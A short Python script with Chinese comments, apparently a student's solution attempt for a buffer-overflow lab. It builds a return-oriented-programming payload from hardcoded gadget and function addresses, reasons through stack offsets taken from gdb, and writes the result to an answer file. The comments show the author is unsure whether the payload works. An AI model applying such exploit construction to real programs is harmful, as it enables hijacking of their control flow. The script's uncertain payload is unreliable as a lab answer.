#!/usr/bin/env python3
import struct

# gadget 和函数地址
mov_rdi = 0x4012da
mov_rax = 0x4012f1
call_rax = 0x401308
jmp_x = 0x40131e
jmp_xs = 0x401334
func1 = 0x401216

def p64(addr):
    return struct.pack('<Q', addr)

# 问题：memcpy 将 payload 复制到 rbp-0x20
# saved_rsp+0x10 指向另一个位置
# 需要计算正确的偏移

# 根据 gdb 输出：
# saved_rsp = 0x7fffffffd590
# rbp = 0x7fffffffd5c0
# rbp-0x20 = 0x7fffffffd5a0 = saved_rsp+0x10 ✓

# 所以 payload 直接放在 rbp-0x20 就行！
# 结构：
# rbp-0x20 (saved_rsp+0x10): [gadget/func1地址]
# rbp-0x18: [padding/参数]
# rbp-0x10: [padding]
# rbp-0x08: [padding]
# rbp: [saved rpb]
# rbp+0x08: [返回地址]

# 但是 memcpy 复制 0x40 (64) 字节！
# 所以 payload 可以更长

# 方案：利用 jmp_xs，它读取 saved_rsp+0x10
# saved_rsp+0x10 刚好 = rbp-0x20
# 所以 payload[0] 应该是目标地址

# 新方案：直接在 rbp-0x20 放 func1 地址
# 但问题是：rdi 怎么变成 0x72？

# 让我试试直接构造 ROP chain
payload = b''
payload += p64(func1)      # rbp-0x20: func1 地址
payload += p64(0x72)       # rbp-0x18: 参数？
payload += b'A' * 48       # 填充到 64 字节

# 写入文件
with open('ans3.txt', 'wb') as f:
    f.write(payload)

print("Payload written to ans3.txt")
print(f"Length: {len(payload)} bytes")
print(f"Payload (hex): {payload.hex()}")
